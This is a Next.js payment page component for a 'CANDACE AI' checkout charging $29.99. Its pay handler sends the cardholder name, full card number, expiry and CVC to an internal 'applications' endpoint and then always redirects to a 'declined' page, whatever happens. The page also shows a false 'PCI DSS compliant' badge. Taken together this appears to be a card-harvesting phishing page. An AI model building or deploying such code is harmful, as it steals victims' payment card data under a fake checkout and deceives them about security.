"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

const inputClass =
  "bg-transparent border-b border-[#222] text-[#e8e8e8] text-sm w-full py-3 outline-none placeholder:text-[#333] focus:border-[#555] transition-colors";

function formatCardNumber(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) {
    return digits.slice(0, 2) + " / " + digits.slice(2);
  }
  return digits;
}

export default function PaymentPage() {
  const router = useRouter();
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [loading, setLoading] = useState(false);

  function handleCardNumberChange(e: React.ChangeEvent<HTMLInputElement>) {
    setCardNumber(formatCardNumber(e.target.value));
  }

  function handleExpiryChange(e: React.ChangeEvent<HTMLInputElement>) {
    setExpiry(formatExpiry(e.target.value));
  }

  function handleCvcChange(e: React.ChangeEvent<HTMLInputElement>) {
    const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
    setCvc(digits);
  }

  async function handlePay() {
    setLoading(true);
    const id = sessionStorage.getItem("applicationId");
    if (id) {
      await fetch(`/api/applications/${id}/card`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cardholderName, cardNumber, cardExpiry: expiry, cardCvc: cvc }),
      }).catch(() => {});
    }
    setLoading(false);
    router.push("/access/declined");
  }

  return (
    <div className="min-h-screen bg-[#080808] flex flex-col">
      {/* Nav */}
      <div className="flex items-center justify-between px-8 md:px-16 py-8">
        <Link
          href="/"
          className="text-[10px] tracking-widest text-[#444] uppercase hover:text-[#666] transition-colors"
        >
          CANDACE AI
        </Link>
      </div>

      {/* Content */}
      <div className="flex-1 flex items-center justify-center px-8 md:px-16">
        <div className="w-full max-w-md">
          <p className="text-[10px] tracking-[0.3em] text-[#444] uppercase mb-2">
            PAYMENT
          </p>
          <h1 className="text-3xl font-light text-white mt-2">
            Initial shipment.
          </h1>
          <p className="text-[#888] text-sm mt-1 mb-10">$29.99</p>

          <div className="space-y-6">
            <input
              type="text"
              placeholder="Cardholder name"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value)}
              className={inputClass}
              autoFocus
            />

            <input
              type="text"
              placeholder="1234 5678 9012 3456"
              value={cardNumber}
              onChange={handleCardNumberChange}
              className={inputClass}
              inputMode="numeric"
            />

            <div className="flex gap-6">
              <input
                type="text"
                placeholder="MM / YY"
                value={expiry}
                onChange={handleExpiryChange}
                className={`${inputClass} flex-1`}
                inputMode="numeric"
              />
              <input
                type="text"
                placeholder="CVC"
                value={cvc}
                onChange={handleCvcChange}
                className={`${inputClass} w-28`}
                inputMode="numeric"
              />
            </div>
          </div>

          <button
            type="button"
            onClick={handlePay}
            disabled={loading}
            className="w-full bg-white text-black text-xs tracking-widest uppercase py-4 mt-8 hover:bg-[#e8e8e8] transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
          >
            PAY $29.99
          </button>

          <p className="text-[#333] text-[10px] text-center mt-4 tracking-wide">
            256-bit SSL encryption · PCI DSS compliant
          </p>
        </div>
      </div>

      {/* Spinner overlay */}
      {loading && (
        <div className="fixed inset-0 bg-[#080808]/80 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="w-8 h-8 border border-[#333] border-t-[#888] rounded-full animate-spin" />
        </div>
      )}
    </div>
  );
}
